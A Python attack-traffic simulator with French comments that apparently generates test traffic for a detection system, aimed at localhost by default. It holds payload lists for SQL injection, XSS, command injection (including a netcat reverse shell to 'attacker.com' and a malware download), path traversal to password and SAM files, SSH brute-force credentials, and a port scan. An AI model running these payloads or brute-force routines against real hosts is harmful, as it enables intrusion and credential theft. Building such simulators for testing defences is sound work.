import requests
import random
import time
from datetime import datetime
import socket
import paramiko
import logging
from concurrent.futures import ThreadPoolExecutor

class AttackSimulator:
    def __init__(self, target_host="localhost", api_port=5000, ssh_port=22):
        self.target_host = target_host
        self.api_port = api_port
        self.ssh_port = ssh_port
        self.base_url = f"http://{target_host}:{api_port}"
        
        # Liste d'adresses IP aléatoires pour simulation
        self.random_ips = [
            f"{random.randint(1, 255)}.{random.randint(1, 255)}."
            f"{random.randint(1, 255)}.{random.randint(1, 255)}"
            for _ in range(20)
        ]
        
        # Configurations d'attaque
        self.sql_injections = [
            "' OR '1'='1", 
            "UNION SELECT * FROM users", 
            "'; DROP TABLE users;--",
            "admin' --",
            "' WAITFOR DELAY '0:0:5'--",
            "') OR ('1'='1",
            "1; SELECT * FROM information_schema.tables"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(`xss`)'>",
            "'\"><script>alert(document.cookie)</script>"
        ]
        
        self.command_injections = [
            "; cat /etc/passwd",
            "| ls -la",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; nc -e /bin/sh attacker.com 4444",
            "| wget http://malicious.com/malware.sh"
        ]
        
        self.path_traversal = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/hosts",
            "%2e%2e%2f%2e%2e%2f/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "../../boot.ini"
        ]
        
        self.ssh_usernames = [
            "admin", "root", "user", "test", "mysql",
            "postgres", "oracle", "guest", "administrator"
        ]
        
        self.ssh_passwords = [
            "password", "123456", "admin", "root", "password123",
            "qwerty", "letmein", "welcome", "admin123"
        ]

    def simulate_sql_injection(self):
        """Simule des attaques par injection SQL"""
        endpoint = f"{self.base_url}/api/login"
        payload = random.choice(self.sql_injections)
        ip = random.choice(self.random_ips)
        
        headers = {
            'X-Forwarded-For': ip,
            'User-Agent': 'sqlmap/1.4.7'
        }
        
        try:
            response = requests.post(endpoint, json={
                'username': f"admin' {payload}",
                'password': 'anything'
            }, headers=headers)
            print(f"SQL Injection simulée depuis {ip}: {payload}")
        except Exception as e:
            print(f"Erreur lors de l'injection SQL: {str(e)}")

    def simulate_xss_attack(self):
        """Simule des attaques XSS"""
        endpoint = f"{self.base_url}/api/comment"
        payload = random.choice(self.xss_payloads)
        ip = random.choice(self.random_ips)
        
        headers = {
            'X-Forwarded-For': ip,
            'User-Agent': 'Mozilla/5.0'
        }
        
        try:
            response = requests.post(endpoint, json={
                'comment': payload
            }, headers=headers)
            print(f"XSS simulée depuis {ip}: {payload}")
        except Exception as e:
            print(f"Erreur lors de l'attaque XSS: {str(e)}")

    def simulate_command_injection(self):
        """Simule des injections de commandes"""
        endpoint = f"{self.base_url}/api/execute"
        payload = random.choice(self.command_injections)
        ip = random.choice(self.random_ips)
        
        headers = {
            'X-Forwarded-For': ip,
            'User-Agent': 'curl/7.68.0'
        }
        
        try:
            response = requests.post(endpoint, json={
                'command': f"echo {payload}"
            }, headers=headers)
            print(f"Injection de commande simulée depuis {ip}: {payload}")
        except Exception as e:
            print(f"Erreur lors de l'injection de commande: {str(e)}")

    def simulate_path_traversal(self):
        """Simule des attaques par traversée de chemin"""
        endpoint = f"{self.base_url}/api/file"
        payload = random.choice(self.path_traversal)
        ip = random.choice(self.random_ips)
        
        headers = {
            'X-Forwarded-For': ip,
            'User-Agent': 'DirBuster-1.0-RC1'
        }
        
        try:
            response = requests.get(f"{endpoint}?path={payload}", headers=headers)
            print(f"Traversée de chemin simulée depuis {ip}: {payload}")
        except Exception as e:
            print(f"Erreur lors de la traversée de chemin: {str(e)}")

    def simulate_ssh_bruteforce(self):
        """Simule des tentatives de bruteforce SSH"""
        ip = random.choice(self.random_ips)
        username = random.choice(self.ssh_usernames)
        password = random.choice(self.ssh_passwords)
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(
                self.target_host,
                port=self.ssh_port,
                username=username,
                password=password,
                timeout=1
            )
            print(f"Tentative SSH depuis {ip}: {username}:{password}")
        except Exception as e:
            print(f"Échec de connexion SSH depuis {ip}: {username}")
        finally:
            ssh.close()

    def simulate_port_scan(self):
        """Simule un scan de ports"""
        ip = random.choice(self.random_ips)
        common_ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 8080]
        
        for port in random.sample(common_ports, 3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_host, port))
                sock.close()
                print(f"Scan de port depuis {ip}: Port {port}")
            except Exception as e:
                print(f"Erreur lors du scan de port {port}: {str(e)}")

    def run_attack_simulation(self, duration_minutes=5):
        """Lance une simulation d'attaques pendant une durée spécifiée"""
        print(f"Démarrage de la simulation d'attaques pour {duration_minutes} minutes...")
        end_time = time.time() + (duration_minutes * 60)
        
        attack_methods = [
            self.simulate_sql_injection,
            self.simulate_xss_attack,
            self.simulate_command_injection,
            self.simulate_path_traversal,
            self.simulate_ssh_bruteforce,
            self.simulate_port_scan
        ]
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            while time.time() < end_time:
                # Lancer plusieurs attaques en parallèle
                executor.submit(random.choice(attack_methods))
                time.sleep(random.uniform(0.5, 2))  # Délai aléatoire entre les attaques

if __name__ == "__main__":
    # Configuration du logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Créer et lancer le simulateur
    simulator = AttackSimulator(target_host="localhost", api_port=5000)
    simulator.run_attack_simulation(duration_minutes=10)  # Simulation de 10 minutes
